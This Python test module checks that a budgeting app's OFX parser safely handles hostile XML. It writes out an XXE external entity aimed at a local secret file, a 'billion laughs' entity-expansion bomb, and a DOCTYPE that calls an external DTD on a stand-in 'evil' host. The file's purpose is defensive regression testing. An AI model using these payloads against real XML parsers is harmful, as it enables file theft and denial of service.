"""Hostile OFX inputs (siege S5) — pins the XML-safety behavior of the ofxparse
backend as a regression contract.

OFX 2.x is XML, and bank exports are untrusted input. ofxparse is
BeautifulSoup-based and does not resolve DTDs/external entities, so XXE and
entity-expansion bombs should be inert — but nothing asserted that. These tests
feed crafted files straight to `_parse_ofx` and require: no external file read,
no entity expansion, and either a clean `ParseError` or a parse that carries
none of the attack payload. A future parser swap that reintroduces entity
resolution fails here, not in production.
"""
from __future__ import annotations

import time
from pathlib import Path

from local_budget.ingest import parse

SECRET = "TOP-SECRET-FILE-CONTENT-1234567"

# OFX 2.x XML wrapper: header declares XML, body carries one statement txn whose
# NAME is the attack payload slot.
_OFX2_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<?OFX OFXHEADER="200" VERSION="200" SECURITY="NONE" OLDFILEUID="NONE" NEWFILEUID="NONE"?>
{doctype}
<OFX>
 <SIGNONMSGSRSV1><SONRS><STATUS><CODE>0</CODE><SEVERITY>INFO</SEVERITY></STATUS>
 <DTSERVER>20260601120000</DTSERVER><LANGUAGE>ENG</LANGUAGE></SONRS></SIGNONMSGSRSV1>
 <BANKMSGSRSV1><STMTTRNRS><TRNUID>1</TRNUID>
 <STATUS><CODE>0</CODE><SEVERITY>INFO</SEVERITY></STATUS>
 <STMTRS><CURDEF>USD</CURDEF>
  <BANKACCTFROM><BANKID>121000248</BANKID><ACCTID>999888777</ACCTID>
  <ACCTTYPE>CHECKING</ACCTTYPE></BANKACCTFROM>
  <BANKTRANLIST><DTSTART>20260601</DTSTART><DTEND>20260630</DTEND>
   <STMTTRN><TRNTYPE>DEBIT</TRNTYPE><DTPOSTED>20260603</DTPOSTED>
   <TRNAMT>-10.00</TRNAMT><FITID>H1</FITID><NAME>{name}</NAME></STMTTRN>
  </BANKTRANLIST>
  <LEDGERBAL><BALAMT>100.00</BALAMT><DTASOF>20260630</DTASOF></LEDGERBAL>
 </STMTRS></STMTTRNRS></BANKMSGSRSV1>
</OFX>
"""


def _try_parse(path: Path):
    """Parse, tolerating a clean ParseError (rejecting hostile input is fine)."""
    try:
        return parse.parse_file(path)
    except parse.ParseError:
        return None


def _all_text(accounts) -> str:
    if not accounts:
        return ""
    return " ".join(
        f"{t.payee} {t.memo}" for a in accounts for t in a.txns
    )


def test_ofx_external_entity_is_not_resolved(tmp_path):
    # XXE: an external entity pointing at a local secret file must never be
    # resolved into any parsed field.
    secret_file = tmp_path / "secret.txt"
    secret_file.write_text(SECRET)
    doctype = (f'<!DOCTYPE OFX [<!ENTITY xxe SYSTEM "file://{secret_file}">]>')
    p = tmp_path / "xxe.ofx"
    p.write_text(_OFX2_TEMPLATE.format(doctype=doctype, name="&xxe;"))

    accounts = _try_parse(p)
    assert SECRET not in _all_text(accounts)


def test_ofx_billion_laughs_is_inert_and_bounded(tmp_path):
    # Entity-expansion bomb: nested entities that would expand to ~10^8 chars.
    # Must not expand (no giant payee) and must finish quickly.
    doctype = (
        "<!DOCTYPE OFX [\n"
        '<!ENTITY a "lolol">\n'
        '<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">\n'
        '<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">\n'
        '<!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">\n'
        '<!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">\n'
        "]>"
    )
    p = tmp_path / "bomb.ofx"
    p.write_text(_OFX2_TEMPLATE.format(doctype=doctype, name="&e;"))

    start = time.monotonic()
    accounts = _try_parse(p)
    elapsed = time.monotonic() - start
    assert elapsed < 10, f"entity bomb took {elapsed:.1f}s — expansion suspected"
    text = _all_text(accounts)
    assert len(text) < 100_000, "entity bomb expanded into parsed fields"


def test_ofx_hostile_doctype_never_crashes_uncleanly(tmp_path):
    # Any DOCTYPE-carrying OFX either parses (payload inert) or raises the
    # clean ParseError the intake pipeline already handles — never a raw
    # XML-library exception that would break the inbox loop.
    p = tmp_path / "doctype.ofx"
    p.write_text(_OFX2_TEMPLATE.format(
        doctype='<!DOCTYPE OFX SYSTEM "http://198.51.100.1/evil.dtd">', name="SHELL"))
    _try_parse(p)  # must not raise anything but ParseError
